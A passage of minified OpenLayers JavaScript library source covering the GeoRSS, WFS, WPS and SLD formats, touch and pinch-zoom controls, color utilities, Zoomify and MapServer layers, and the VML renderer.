OpenLayers.Geometry.Point(c[1],c[2]),d.push(b),b=new OpenLayers.Geometry.Point(c[3],c[2]),d.push(b),b=new OpenLayers.Geometry.Point(c[3],c[0]),d.push(b),b=new OpenLayers.Geometry.Point(c[1],c[0]),d.push(b)),h=new OpenLayers.Geometry.Polygon([new OpenLayers.Geometry.LinearRing(d)])); h&amp;&amp;(this.internalProjection&amp;&amp;this.externalProjection)&amp;&amp;h.transform(this.externalProjection,this.internalProjection);return h},createFeatureFromItem:function(a){var b=this.createGeometryFromItem(a),c=this._getChildValue(a,"*","title",this.featureTitle),d=this._getChildValue(a,"*","description",this._getChildValue(a,"*","content",this._getChildValue(a,"*","summary",this.featureDescription))),e=this._getChildValue(a,"*","link");if(!e)try{e=this.getElementsByTagNameNS(a,"*","link")[0].getAttribute("href")}catch(f){e= null}a=this._getChildValue(a,"*","id",null);b=new OpenLayers.Feature.Vector(b,{title:c,description:d,link:e});b.fid=a;return b},_getChildValue:function(a,b,c,d){return(a=this.getElementsByTagNameNS(a,b,c))&amp;&amp;a[0]&amp;&amp;a[0].firstChild&amp;&amp;a[0].firstChild.nodeValue?this.getChildValue(a[0]):void 0==d?"":d},read:function(a){"string"==typeof a&amp;&amp;(a=OpenLayers.Format.XML.prototype.read.apply(this,[a]));var b=null,b=this.getElementsByTagNameNS(a,"*","item");0==b.length&amp;&amp;(b=this.getElementsByTagNameNS(a,"*","entry")); a=b.length;for(var c=Array(a),d=0;d&lt;a;d++)c[d]=this.createFeatureFromItem(b[d]);return c},write:function(a){var b;if(OpenLayers.Util.isArray(a)){b=this.createElementNS(this.rssns,"rss");for(var c=0,d=a.length;c&lt;d;c++)b.appendChild(this.createFeatureXML(a[c]))}else b=this.createFeatureXML(a);return OpenLayers.Format.XML.prototype.write.apply(this,[b])},createFeatureXML:function(a){var b=this.buildGeometryNode(a.geometry),c=this.createElementNS(this.rssns,"item"),d=this.createElementNS(this.rssns,"title"); d.appendChild(this.createTextNode(a.attributes.title?a.attributes.title:""));var e=this.createElementNS(this.rssns,"description");e.appendChild(this.createTextNode(a.attributes.description?a.attributes.description:""));c.appendChild(d);c.appendChild(e);a.attributes.link&amp;&amp;(d=this.createElementNS(this.rssns,"link"),d.appendChild(this.createTextNode(a.attributes.link)),c.appendChild(d));for(var f in a.attributes)"link"!=f&amp;&amp;("title"!=f&amp;&amp;"description"!=f)&amp;&amp;(d=this.createTextNode(a.attributes[f]),e=f,-1!= f.search(":")&amp;&amp;(e=f.split(":")[1]),e=this.createElementNS(this.featureNS,"feature:"+e),e.appendChild(d),c.appendChild(e));c.appendChild(b);return c},buildGeometryNode:function(a){this.internalProjection&amp;&amp;this.externalProjection&amp;&amp;(a=a.clone(),a.transform(this.internalProjection,this.externalProjection));var b;if("OpenLayers.Geometry.Polygon"==a.CLASS_NAME)b=this.createElementNS(this.georssns,"georss:polygon"),b.appendChild(this.buildCoordinatesNode(a.components[0]));else if("OpenLayers.Geometry.LineString"== a.CLASS_NAME)b=this.createElementNS(this.georssns,"georss:line"),b.appendChild(this.buildCoordinatesNode(a));else if("OpenLayers.Geometry.Point"==a.CLASS_NAME)b=this.createElementNS(this.georssns,"georss:point"),b.appendChild(this.buildCoordinatesNode(a));else throw"Couldn't parse "+a.CLASS_NAME;return b},buildCoordinatesNode:function(a){var b=null;a.components&amp;&amp;(b=a.components);if(b){a=b.length;for(var c=Array(a),d=0;d&lt;a;d++)c[d]=b[d].y+" "+b[d].x;b=c.join(" ")}else b=a.y+" "+a.x;return this.createTextNode(b)}, CLASS_NAME:"OpenLayers.Format.GeoRSS"});OpenLayers.Format.WPSCapabilities=OpenLayers.Class(OpenLayers.Format.XML.VersionedOGC,{defaultVersion:"1.0.0",CLASS_NAME:"OpenLayers.Format.WPSCapabilities"});OpenLayers.Format.WPSCapabilities.v1_0_0=OpenLayers.Class(OpenLayers.Format.XML,{namespaces:{ows:"http://www.opengis.net/ows/1.1",wps:"http://www.opengis.net/wps/1.0.0",xlink:"http://www.w3.org/1999/xlink"},regExes:{trimSpace:/^\s*|\s*$/g,removeSpace:/\s*/g,splitSpace:/\s+/,trimComma:/\s*,\s*/g},initialize:function(a){OpenLayers.Format.XML.prototype.initialize.apply(this,[a])},read:function(a){"string"==typeof a&amp;&amp;(a=OpenLayers.Format.XML.prototype.read.apply(this,[a]));a&amp;&amp;9==a.nodeType&amp;&amp;(a=a.documentElement); var b={};this.readNode(a,b);return b},readers:{wps:{Capabilities:function(a,b){this.readChildNodes(a,b)},ProcessOfferings:function(a,b){b.processOfferings={};this.readChildNodes(a,b.processOfferings)},Process:function(a,b){var c={processVersion:this.getAttributeNS(a,this.namespaces.wps,"processVersion")};this.readChildNodes(a,c);b[c.identifier]=c},Languages:function(a,b){b.languages=[];this.readChildNodes(a,b.languages)},Default:function(a,b){var c={isDefault:!0};this.readChildNodes(a,c);b.push(c)}, Supported:function(a,b){var c={};this.readChildNodes(a,c);b.push(c)}},ows:OpenLayers.Format.OWSCommon.v1_1_0.prototype.readers.ows},CLASS_NAME:"OpenLayers.Format.WPSCapabilities.v1_0_0"});OpenLayers.Control.PinchZoom=OpenLayers.Class(OpenLayers.Control,{type:OpenLayers.Control.TYPE_TOOL,pinchOrigin:null,currentCenter:null,autoActivate:!0,preserveCenter:!1,initialize:function(a){OpenLayers.Control.prototype.initialize.apply(this,arguments);this.handler=new OpenLayers.Handler.Pinch(this,{start:this.pinchStart,move:this.pinchMove,done:this.pinchDone},this.handlerOptions)},pinchStart:function(a,b){var c=this.preserveCenter?this.map.getPixelFromLonLat(this.map.getCenter()):a.xy;this.currentCenter= this.pinchOrigin=c},pinchMove:function(a,b){var c=b.scale,d=this.map.layerContainerOriginPx,e=this.pinchOrigin,f=this.preserveCenter?this.map.getPixelFromLonLat(this.map.getCenter()):a.xy,g=Math.round(d.x+f.x-e.x+(c-1)*(d.x-e.x)),d=Math.round(d.y+f.y-e.y+(c-1)*(d.y-e.y));this.map.applyTransform(g,d,c);this.currentCenter=f},pinchDone:function(a,b,c){this.map.applyTransform();a=this.map.getZoomForResolution(this.map.getResolution()/c.scale,!0);if(a!==this.map.getZoom()||!this.currentCenter.equals(this.pinchOrigin)){b= this.map.getResolutionForZoom(a);c=this.map.getLonLatFromPixel(this.pinchOrigin);var d=this.currentCenter,e=this.map.getSize();c.lon+=b*(e.w/2-d.x);c.lat-=b*(e.h/2-d.y);this.map.div.clientWidth=this.map.div.clientWidth;this.map.setCenter(c,a)}},CLASS_NAME:"OpenLayers.Control.PinchZoom"});OpenLayers.Control.TouchNavigation=OpenLayers.Class(OpenLayers.Control,{dragPan:null,dragPanOptions:null,pinchZoom:null,pinchZoomOptions:null,clickHandlerOptions:null,documentDrag:!1,autoActivate:!0,initialize:function(a){this.handlers={};OpenLayers.Control.prototype.initialize.apply(this,arguments)},destroy:function(){this.deactivate();this.dragPan&amp;&amp;this.dragPan.destroy();this.dragPan=null;this.pinchZoom&amp;&amp;(this.pinchZoom.destroy(),delete this.pinchZoom);OpenLayers.Control.prototype.destroy.apply(this, arguments)},activate:function(){return OpenLayers.Control.prototype.activate.apply(this,arguments)?(this.dragPan.activate(),this.handlers.click.activate(),this.pinchZoom.activate(),!0):!1},deactivate:function(){return OpenLayers.Control.prototype.deactivate.apply(this,arguments)?(this.dragPan.deactivate(),this.handlers.click.deactivate(),this.pinchZoom.deactivate(),!0):!1},draw:function(){var a={click:this.defaultClick,dblclick:this.defaultDblClick},b=OpenLayers.Util.extend({"double":!0,stopDouble:!0, pixelTolerance:2},this.clickHandlerOptions);this.handlers.click=new OpenLayers.Handler.Click(this,a,b);this.dragPan=new OpenLayers.Control.DragPan(OpenLayers.Util.extend({map:this.map,documentDrag:this.documentDrag},this.dragPanOptions));this.dragPan.draw();this.pinchZoom=new OpenLayers.Control.PinchZoom(OpenLayers.Util.extend({map:this.map},this.pinchZoomOptions))},defaultClick:function(a){a.lastTouches&amp;&amp;2==a.lastTouches.length&amp;&amp;this.map.zoomOut()},defaultDblClick:function(a){this.map.zoomTo(this.map.zoom+ 1,a.xy)},CLASS_NAME:"OpenLayers.Control.TouchNavigation"});OpenLayers.Console.warn("OpenLayers.Rico is deprecated");OpenLayers.Rico=OpenLayers.Rico||{}; OpenLayers.Rico.Color=OpenLayers.Class({initialize:function(a,b,c){this.rgb={r:a,g:b,b:c}},setRed:function(a){this.rgb.r=a},setGreen:function(a){this.rgb.g=a},setBlue:function(a){this.rgb.b=a},setHue:function(a){var b=this.asHSB();b.h=a;this.rgb=OpenLayers.Rico.Color.HSBtoRGB(b.h,b.s,b.b)},setSaturation:function(a){var b=this.asHSB();b.s=a;this.rgb=OpenLayers.Rico.Color.HSBtoRGB(b.h,b.s,b.b)},setBrightness:function(a){var b=this.asHSB();b.b=a;this.rgb=OpenLayers.Rico.Color.HSBtoRGB(b.h,b.s,b.b)}, darken:function(a){var b=this.asHSB();this.rgb=OpenLayers.Rico.Color.HSBtoRGB(b.h,b.s,Math.max(b.b-a,0))},brighten:function(a){var b=this.asHSB();this.rgb=OpenLayers.Rico.Color.HSBtoRGB(b.h,b.s,Math.min(b.b+a,1))},blend:function(a){this.rgb.r=Math.floor((this.rgb.r+a.rgb.r)/2);this.rgb.g=Math.floor((this.rgb.g+a.rgb.g)/2);this.rgb.b=Math.floor((this.rgb.b+a.rgb.b)/2)},isBright:function(){this.asHSB();return 0.5&lt;this.asHSB().b},isDark:function(){return!this.isBright()},asRGB:function(){return"rgb("+ this.rgb.r+","+this.rgb.g+","+this.rgb.b+")"},asHex:function(){return"#"+this.rgb.r.toColorPart()+this.rgb.g.toColorPart()+this.rgb.b.toColorPart()},asHSB:function(){return OpenLayers.Rico.Color.RGBtoHSB(this.rgb.r,this.rgb.g,this.rgb.b)},toString:function(){return this.asHex()}}); OpenLayers.Rico.Color.createFromHex=function(a){if(4==a.length){var b=a;a="#";for(var c=1;4>c;c++)a+=b.charAt(c)+b.charAt(c)}0==a.indexOf("#")&amp;&amp;(a=a.substring(1));b=a.substring(0,2);c=a.substring(2,4);a=a.substring(4,6);return new OpenLayers.Rico.Color(parseInt(b,16),parseInt(c,16),parseInt(a,16))}; OpenLayers.Rico.Color.createColorFromBackground=function(a){var b=OpenLayers.Element.getStyle(OpenLayers.Util.getElement(a),"backgroundColor");return"transparent"==b&amp;&amp;a.parentNode?OpenLayers.Rico.Color.createColorFromBackground(a.parentNode):null==b?new OpenLayers.Rico.Color(255,255,255):0==b.indexOf("rgb(")?(a=b.substring(4,b.length-1).split(","),new OpenLayers.Rico.Color(parseInt(a[0]),parseInt(a[1]),parseInt(a[2]))):0==b.indexOf("#")?OpenLayers.Rico.Color.createFromHex(b):new OpenLayers.Rico.Color(255, 255,255)}; OpenLayers.Rico.Color.HSBtoRGB=function(a,b,c){var d=0,e=0,f=0;if(0==b)f=e=d=parseInt(255*c+0.5);else{a=6*(a-Math.floor(a));var g=a-Math.floor(a),h=c*(1-b),k=c*(1-b*g);b=c*(1-b*(1-g));switch(parseInt(a)){case 0:d=255*c+0.5;e=255*b+0.5;f=255*h+0.5;break;case 1:d=255*k+0.5;e=255*c+0.5;f=255*h+0.5;break;case 2:d=255*h+0.5;e=255*c+0.5;f=255*b+0.5;break;case 3:d=255*h+0.5;e=255*k+0.5;f=255*c+0.5;break;case 4:d=255*b+0.5;e=255*h+0.5;f=255*c+0.5;break;case 5:d=255*c+0.5,e=255*h+0.5,f=255*k+0.5}}return{r:parseInt(d),g:parseInt(e), b:parseInt(f)}};OpenLayers.Rico.Color.RGBtoHSB=function(a,b,c){var d,e=a>b?a:b;c>e&amp;&amp;(e=c);var f=a&lt;b?a:b;c&lt;f&amp;&amp;(f=c);d=0!=e?(e-f)/e:0;if(0==d)a=0;else{var g=(e-a)/(e-f),h=(e-b)/(e-f);c=(e-c)/(e-f);a=(a==e?c-h:b==e?2+g-c:4+h-g)/6;0>a&amp;&amp;(a+=1)}return{h:a,s:d,b:e/255}};OpenLayers.Style2=OpenLayers.Class({id:null,name:null,title:null,description:null,layerName:null,isDefault:!1,rules:null,initialize:function(a){OpenLayers.Util.extend(this,a);this.id=OpenLayers.Util.createUniqueID(this.CLASS_NAME+"_")},destroy:function(){for(var a=0,b=this.rules.length;a&lt;b;a++)this.rules[a].destroy();delete this.rules},clone:function(){var a=OpenLayers.Util.extend({},this);if(this.rules){a.rules=[];for(var b=0,c=this.rules.length;b&lt;c;++b)a.rules.push(this.rules[b].clone())}return new OpenLayers.Style2(a)}, CLASS_NAME:"OpenLayers.Style2"});OpenLayers.Format.WFS=OpenLayers.Class(OpenLayers.Format.GML,{layer:null,wfsns:"http://www.opengis.net/wfs",ogcns:"http://www.opengis.net/ogc",initialize:function(a,b){OpenLayers.Format.GML.prototype.initialize.apply(this,[a]);this.layer=b;this.layer.featureNS&amp;&amp;(this.featureNS=this.layer.featureNS);this.layer.options.geometry_column&amp;&amp;(this.geometryName=this.layer.options.geometry_column);this.layer.options.typename&amp;&amp;(this.featureName=this.layer.options.typename)},write:function(a){var b=this.createElementNS(this.wfsns, "wfs:Transaction");b.setAttribute("version","1.0.0");b.setAttribute("service","WFS");for(var c=0;c&lt;a.length;c++)switch(a[c].state){case OpenLayers.State.INSERT:b.appendChild(this.insert(a[c]));break;case OpenLayers.State.UPDATE:b.appendChild(this.update(a[c]));break;case OpenLayers.State.DELETE:b.appendChild(this.remove(a[c]))}return OpenLayers.Format.XML.prototype.write.apply(this,[b])},createFeatureXML:function(a){var b=this.buildGeometryNode(a.geometry),c=this.createElementNS(this.featureNS,"feature:"+ this.geometryName);c.appendChild(b);b=this.createElementNS(this.featureNS,"feature:"+this.featureName);b.appendChild(c);for(var d in a.attributes){var c=this.createTextNode(a.attributes[d]),e=d;-1!=d.search(":")&amp;&amp;(e=d.split(":")[1]);e=this.createElementNS(this.featureNS,"feature:"+e);e.appendChild(c);b.appendChild(e)}return b},insert:function(a){var b=this.createElementNS(this.wfsns,"wfs:Insert");b.appendChild(this.createFeatureXML(a));return b},update:function(a){a.fid||OpenLayers.Console.userError(OpenLayers.i18n("noFID")); var b=this.createElementNS(this.wfsns,"wfs:Update");b.setAttribute("typeName",this.featurePrefix+":"+this.featureName);b.setAttribute("xmlns:"+this.featurePrefix,this.featureNS);var c=this.createElementNS(this.wfsns,"wfs:Property"),d=this.createElementNS(this.wfsns,"wfs:Name"),e=this.createTextNode(this.geometryName);d.appendChild(e);c.appendChild(d);d=this.createElementNS(this.wfsns,"wfs:Value");e=this.buildGeometryNode(a.geometry);a.layer&amp;&amp;e.setAttribute("srsName",a.layer.projection.getCode()); d.appendChild(e);c.appendChild(d);b.appendChild(c);for(var f in a.attributes)c=this.createElementNS(this.wfsns,"wfs:Property"),d=this.createElementNS(this.wfsns,"wfs:Name"),d.appendChild(this.createTextNode(f)),c.appendChild(d),d=this.createElementNS(this.wfsns,"wfs:Value"),d.appendChild(this.createTextNode(a.attributes[f])),c.appendChild(d),b.appendChild(c);c=this.createElementNS(this.ogcns,"ogc:Filter");f=this.createElementNS(this.ogcns,"ogc:FeatureId");f.setAttribute("fid",a.fid);c.appendChild(f); b.appendChild(c);return b},remove:function(a){if(!a.fid)return OpenLayers.Console.userError(OpenLayers.i18n("noFID")),!1;var b=this.createElementNS(this.wfsns,"wfs:Delete");b.setAttribute("typeName",this.featurePrefix+":"+this.featureName);b.setAttribute("xmlns:"+this.featurePrefix,this.featureNS);var c=this.createElementNS(this.ogcns,"ogc:Filter"),d=this.createElementNS(this.ogcns,"ogc:FeatureId");d.setAttribute("fid",a.fid);c.appendChild(d);b.appendChild(c);return b},destroy:function(){this.layer= null},CLASS_NAME:"OpenLayers.Format.WFS"});OpenLayers.Format.SLD.v1_0_0_GeoServer=OpenLayers.Class(OpenLayers.Format.SLD.v1_0_0,{version:"1.0.0",profile:"GeoServer",readers:OpenLayers.Util.applyDefaults({sld:OpenLayers.Util.applyDefaults({Priority:function(a,b){var c=this.readers.ogc._expression.call(this,a);c&amp;&amp;(b.priority=c)},VendorOption:function(a,b){b.vendorOptions||(b.vendorOptions={});b.vendorOptions[a.getAttribute("name")]=this.getChildValue(a)},TextSymbolizer:function(a,b){OpenLayers.Format.SLD.v1_0_0.prototype.readers.sld.TextSymbolizer.apply(this, arguments);var c=this.multipleSymbolizers?b.symbolizers[b.symbolizers.length-1]:b.symbolizer.Text;void 0===c.graphic&amp;&amp;(c.graphic=!1)}},OpenLayers.Format.SLD.v1_0_0.prototype.readers.sld)},OpenLayers.Format.SLD.v1_0_0.prototype.readers),writers:OpenLayers.Util.applyDefaults({sld:OpenLayers.Util.applyDefaults({Priority:function(a){return this.writers.sld._OGCExpression.call(this,"sld:Priority",a)},VendorOption:function(a){return this.createElementNSPlus("sld:VendorOption",{attributes:{name:a.name}, value:a.value})},TextSymbolizer:function(a){var b=OpenLayers.Format.SLD.v1_0_0.prototype.writers.sld.TextSymbolizer.apply(this,arguments);!1!==a.graphic&amp;&amp;(a.externalGraphic||a.graphicName)&amp;&amp;this.writeNode("Graphic",a,b);"priority"in a&amp;&amp;this.writeNode("Priority",a.priority,b);return this.addVendorOptions(b,a)},PointSymbolizer:function(a){var b=OpenLayers.Format.SLD.v1_0_0.prototype.writers.sld.PointSymbolizer.apply(this,arguments);return this.addVendorOptions(b,a)},LineSymbolizer:function(a){var b= OpenLayers.Format.SLD.v1_0_0.prototype.writers.sld.LineSymbolizer.apply(this,arguments);return this.addVendorOptions(b,a)},PolygonSymbolizer:function(a){var b=OpenLayers.Format.SLD.v1_0_0.prototype.writers.sld.PolygonSymbolizer.apply(this,arguments);return this.addVendorOptions(b,a)}},OpenLayers.Format.SLD.v1_0_0.prototype.writers.sld)},OpenLayers.Format.SLD.v1_0_0.prototype.writers),addVendorOptions:function(a,b){if(b.vendorOptions)for(var c in b.vendorOptions)this.writeNode("VendorOption",{name:c, value:b.vendorOptions[c]},a);return a},CLASS_NAME:"OpenLayers.Format.SLD.v1_0_0_GeoServer"});OpenLayers.Layer.Boxes=OpenLayers.Class(OpenLayers.Layer.Markers,{drawMarker:function(a){var b=this.map.getLayerPxFromLonLat({lon:a.bounds.left,lat:a.bounds.top}),c=this.map.getLayerPxFromLonLat({lon:a.bounds.right,lat:a.bounds.bottom});null==c||null==b?a.display(!1):(b=a.draw(b,{w:Math.max(1,c.x-b.x),h:Math.max(1,c.y-b.y)}),a.drawn||(this.div.appendChild(b),a.drawn=!0))},removeMarker:function(a){OpenLayers.Util.removeItem(this.markers,a);null!=a.div&amp;&amp;a.div.parentNode==this.div&amp;&amp;this.div.removeChild(a.div)}, CLASS_NAME:"OpenLayers.Layer.Boxes"});OpenLayers.Format.WFSCapabilities.v1_0_0=OpenLayers.Class(OpenLayers.Format.WFSCapabilities.v1,{readers:{wfs:OpenLayers.Util.applyDefaults({Service:function(a,b){b.service={};this.readChildNodes(a,b.service)},Fees:function(a,b){var c=this.getChildValue(a);c&amp;&amp;"none"!=c.toLowerCase()&amp;&amp;(b.fees=c)},AccessConstraints:function(a,b){var c=this.getChildValue(a);c&amp;&amp;"none"!=c.toLowerCase()&amp;&amp;(b.accessConstraints=c)},OnlineResource:function(a,b){var c=this.getChildValue(a);c&amp;&amp;"none"!=c.toLowerCase()&amp;&amp;(b.onlineResource= c)},Keywords:function(a,b){var c=this.getChildValue(a);c&amp;&amp;"none"!=c.toLowerCase()&amp;&amp;(b.keywords=c.split(", "))},Capability:function(a,b){b.capability={};this.readChildNodes(a,b.capability)},Request:function(a,b){b.request={};this.readChildNodes(a,b.request)},GetFeature:function(a,b){b.getfeature={href:{},formats:[]};this.readChildNodes(a,b.getfeature)},ResultFormat:function(a,b){for(var c=a.childNodes,d,e=0;e&lt;c.length;e++)d=c[e],1==d.nodeType&amp;&amp;b.formats.push(d.nodeName)},DCPType:function(a,b){this.readChildNodes(a, b)},HTTP:function(a,b){this.readChildNodes(a,b.href)},Get:function(a,b){b.get=a.getAttribute("onlineResource")},Post:function(a,b){b.post=a.getAttribute("onlineResource")},SRS:function(a,b){var c=this.getChildValue(a);c&amp;&amp;(b.srs=c)}},OpenLayers.Format.WFSCapabilities.v1.prototype.readers.wfs)},CLASS_NAME:"OpenLayers.Format.WFSCapabilities.v1_0_0"});OpenLayers.Format.WMSCapabilities.v1_3=OpenLayers.Class(OpenLayers.Format.WMSCapabilities.v1,{readers:{wms:OpenLayers.Util.applyDefaults({WMS_Capabilities:function(a,b){this.readChildNodes(a,b)},LayerLimit:function(a,b){b.layerLimit=parseInt(this.getChildValue(a))},MaxWidth:function(a,b){b.maxWidth=parseInt(this.getChildValue(a))},MaxHeight:function(a,b){b.maxHeight=parseInt(this.getChildValue(a))},BoundingBox:function(a,b){var c=OpenLayers.Format.WMSCapabilities.v1.prototype.readers.wms.BoundingBox.apply(this, [a,b]);c.srs=a.getAttribute("CRS");b.bbox[c.srs]=c},CRS:function(a,b){this.readers.wms.SRS.apply(this,[a,b])},EX_GeographicBoundingBox:function(a,b){b.llbbox=[];this.readChildNodes(a,b.llbbox)},westBoundLongitude:function(a,b){b[0]=this.getChildValue(a)},eastBoundLongitude:function(a,b){b[2]=this.getChildValue(a)},southBoundLatitude:function(a,b){b[1]=this.getChildValue(a)},northBoundLatitude:function(a,b){b[3]=this.getChildValue(a)},MinScaleDenominator:function(a,b){b.maxScale=parseFloat(this.getChildValue(a)).toPrecision(16)}, MaxScaleDenominator:function(a,b){b.minScale=parseFloat(this.getChildValue(a)).toPrecision(16)},Dimension:function(a,b){var c={name:a.getAttribute("name").toLowerCase(),units:a.getAttribute("units"),unitsymbol:a.getAttribute("unitSymbol"),nearestVal:"1"===a.getAttribute("nearestValue"),multipleVal:"1"===a.getAttribute("multipleValues"),"default":a.getAttribute("default")||"",current:"1"===a.getAttribute("current"),values:this.getChildValue(a).split(",")};b.dimensions[c.name]=c},Keyword:function(a, b){var c={value:this.getChildValue(a),vocabulary:a.getAttribute("vocabulary")};b.keywords&amp;&amp;b.keywords.push(c)}},OpenLayers.Format.WMSCapabilities.v1.prototype.readers.wms),sld:{UserDefinedSymbolization:function(a,b){this.readers.wms.UserDefinedSymbolization.apply(this,[a,b]);b.userSymbols.inlineFeature=1==parseInt(a.getAttribute("InlineFeature"));b.userSymbols.remoteWCS=1==parseInt(a.getAttribute("RemoteWCS"))},DescribeLayer:function(a,b){this.readers.wms.DescribeLayer.apply(this,[a,b])},GetLegendGraphic:function(a, b){this.readers.wms.GetLegendGraphic.apply(this,[a,b])}}},CLASS_NAME:"OpenLayers.Format.WMSCapabilities.v1_3"});OpenLayers.Layer.Zoomify=OpenLayers.Class(OpenLayers.Layer.Grid,{size:null,isBaseLayer:!0,standardTileSize:256,tileOriginCorner:"tl",numberOfTiers:0,tileCountUpToTier:null,tierSizeInTiles:null,tierImageSize:null,initialize:function(a,b,c,d){this.initializeZoomify(c);OpenLayers.Layer.Grid.prototype.initialize.apply(this,[a,b,c,{},d])},initializeZoomify:function(a){var b=a.clone();this.size=a.clone();a=new OpenLayers.Size(Math.ceil(b.w/this.standardTileSize),Math.ceil(b.h/this.standardTileSize));this.tierSizeInTiles= [a];for(this.tierImageSize=[b];b.w>this.standardTileSize||b.h>this.standardTileSize;)b=new OpenLayers.Size(Math.floor(b.w/2),Math.floor(b.h/2)),a=new OpenLayers.Size(Math.ceil(b.w/this.standardTileSize),Math.ceil(b.h/this.standardTileSize)),this.tierSizeInTiles.push(a),this.tierImageSize.push(b);this.tierSizeInTiles.reverse();this.tierImageSize.reverse();this.numberOfTiers=this.tierSizeInTiles.length;b=[1];this.tileCountUpToTier=[0];for(a=1;a&lt;this.numberOfTiers;a++)b.unshift(Math.pow(2,a)),this.tileCountUpToTier.push(this.tierSizeInTiles[a- 1].w*this.tierSizeInTiles[a-1].h+this.tileCountUpToTier[a-1]);this.serverResolutions||(this.serverResolutions=b)},destroy:function(){OpenLayers.Layer.Grid.prototype.destroy.apply(this,arguments);this.tileCountUpToTier.length=0;this.tierSizeInTiles.length=0;this.tierImageSize.length=0},clone:function(a){null==a&amp;&amp;(a=new OpenLayers.Layer.Zoomify(this.name,this.url,this.size,this.options));return a=OpenLayers.Layer.Grid.prototype.clone.apply(this,[a])},getURL:function(a){a=this.adjustBounds(a);var b= this.getServerResolution(),c=Math.round((a.left-this.tileOrigin.lon)/(b*this.tileSize.w));a=Math.round((this.tileOrigin.lat-a.top)/(b*this.tileSize.h));b=this.getZoomForResolution(b);c="TileGroup"+Math.floor((c+a*this.tierSizeInTiles[b].w+this.tileCountUpToTier[b])/256)+"/"+b+"-"+c+"-"+a+".jpg";b=this.url;OpenLayers.Util.isArray(b)&amp;&amp;(b=this.selectUrl(c,b));return b+c},getImageSize:function(){if(0&lt;arguments.length){var a=this.adjustBounds(arguments[0]),b=this.getServerResolution(),c=Math.round((a.left- this.tileOrigin.lon)/(b*this.tileSize.w)),a=Math.round((this.tileOrigin.lat-a.top)/(b*this.tileSize.h)),b=this.getZoomForResolution(b),d=this.standardTileSize,e=this.standardTileSize;c==this.tierSizeInTiles[b].w-1&amp;&amp;(d=this.tierImageSize[b].w%this.standardTileSize);a==this.tierSizeInTiles[b].h-1&amp;&amp;(e=this.tierImageSize[b].h%this.standardTileSize);return new OpenLayers.Size(d,e)}return this.tileSize},setMap:function(a){OpenLayers.Layer.Grid.prototype.setMap.apply(this,arguments);this.tileOrigin=new OpenLayers.LonLat(this.map.maxExtent.left, this.map.maxExtent.top)},CLASS_NAME:"OpenLayers.Layer.Zoomify"});OpenLayers.Layer.MapServer=OpenLayers.Class(OpenLayers.Layer.Grid,{DEFAULT_PARAMS:{mode:"map",map_imagetype:"png"},initialize:function(a,b,c,d){OpenLayers.Layer.Grid.prototype.initialize.apply(this,arguments);this.params=OpenLayers.Util.applyDefaults(this.params,this.DEFAULT_PARAMS);if(null==d||null==d.isBaseLayer)this.isBaseLayer="true"!=this.params.transparent&amp;&amp;!0!=this.params.transparent},clone:function(a){null==a&amp;&amp;(a=new OpenLayers.Layer.MapServer(this.name,this.url,this.params,this.getOptions())); return a=OpenLayers.Layer.Grid.prototype.clone.apply(this,[a])},getURL:function(a){a=this.adjustBounds(a);a=[a.left,a.bottom,a.right,a.top];var b=this.getImageSize();return this.getFullRequestString({mapext:a,imgext:a,map_size:[b.w,b.h],imgx:b.w/2,imgy:b.h/2,imgxy:[b.w,b.h]})},getFullRequestString:function(a,b){var c=null==b?this.url:b,d=OpenLayers.Util.extend({},this.params),d=OpenLayers.Util.extend(d,a),e=OpenLayers.Util.getParameterString(d);OpenLayers.Util.isArray(c)&amp;&amp;(c=this.selectUrl(e,c)); var e=OpenLayers.Util.upperCaseObject(OpenLayers.Util.getParameters(c)),f;for(f in d)f.toUpperCase()in e&amp;&amp;delete d[f];e=OpenLayers.Util.getParameterString(d);d=c;e=e.replace(/,/g,"+");""!=e&amp;&amp;(f=c.charAt(c.length-1),d="&amp;"==f||"?"==f?d+e:-1==c.indexOf("?")?d+("?"+e):d+("&amp;"+e));return d},CLASS_NAME:"OpenLayers.Layer.MapServer"});OpenLayers.Renderer.VML=OpenLayers.Class(OpenLayers.Renderer.Elements,{xmlns:"urn:schemas-microsoft-com:vml",symbolCache:{},offset:null,initialize:function(a){if(this.supported()){if(!document.namespaces.olv){document.namespaces.add("olv",this.xmlns);for(var b=document.createStyleSheet(),c="shape rect oval fill stroke imagedata group textbox".split(" "),d=0,e=c.length;d&lt;e;d++)b.addRule("olv\\:"+c[d],"behavior: url(#default#VML); position: absolute; display: inline-block;")}OpenLayers.Renderer.Elements.prototype.initialize.apply(this, arguments)}},supported:function(){return!!document.namespaces},setExtent:function(a,b){var c=OpenLayers.Renderer.Elements.prototype.setExtent.apply(this,arguments),d=this.getResolution(),e=a.left/d|0,d=a.top/d-this.size.h|0;b||!this.offset?(this.offset={x:e,y:d},d=e=0):(e-=this.offset.x,d-=this.offset.y);this.root.coordorigin=e-this.xOffset+" "+d;for(var e=[this.root,this.vectorRoot,this.textRoot],f=0,g=e.length;f&lt;g;++f)d=e[f],d.coordsize=this.size.w+" "+this.size.h;this.root.style.flip="y";return c}, setSize:function(a){OpenLayers.Renderer.prototype.setSize.apply(this,arguments);for(var b=[this.rendererRoot,this.root,this.vectorRoot,this.textRoot],c=this.size.w+"px",d=this.size.h+"px",e,f=0,g=b.length;f&lt;g;++f)e=b[f],e.style.width=c,e.style.height=d},getNodeType:function(a,b){var c=null;switch(a.CLASS_NAME){case "OpenLayers.Geometry.Point":c=b.externalGraphic?"olv:rect":this.isComplexSymbol(b.graphicName)?"olv:shape":"olv:oval";break;case "OpenLayers.Geometry.Rectangle":c="olv:rect";break;case "OpenLayers.Geometry.LineString":case "OpenLayers.Geometry.LinearRing":case "OpenLayers.Geometry.Polygon":case "OpenLayers.Geometry.Curve":c= "olv:shape"}return c},setStyle:function(a,b,c,d){b=b||a._style;c=c||a._options;var e=b.fillColor,f=b.title||b.graphicTitle;f&amp;&amp;(a.title=f);if("OpenLayers.Geometry.Point"===a._geometryClass)if(b.externalGraphic){c.isFilled=!0;var e=b.graphicWidth||b.graphicHeight,f=b.graphicHeight||b.graphicWidth,e=e?e:2*b.pointRadius,f=f?f:2*b.pointRadius,g=this.getResolution(),h=void 0!=b.graphicXOffset?b.graphicXOffset:-(0.5*e),k=void 0!=b.graphicYOffset?b.graphicYOffset:-(0.5*f);a.style.left=((d.x-this.featureDx)/ g-this.offset.x+h|0)+"px";a.style.top=(d.y/g-this.offset.y-(k+f)|0)+"px";a.style.width=e+"px";a.style.height=f+"px";a.style.flip="y";e="none";c.isStroked=!1}else 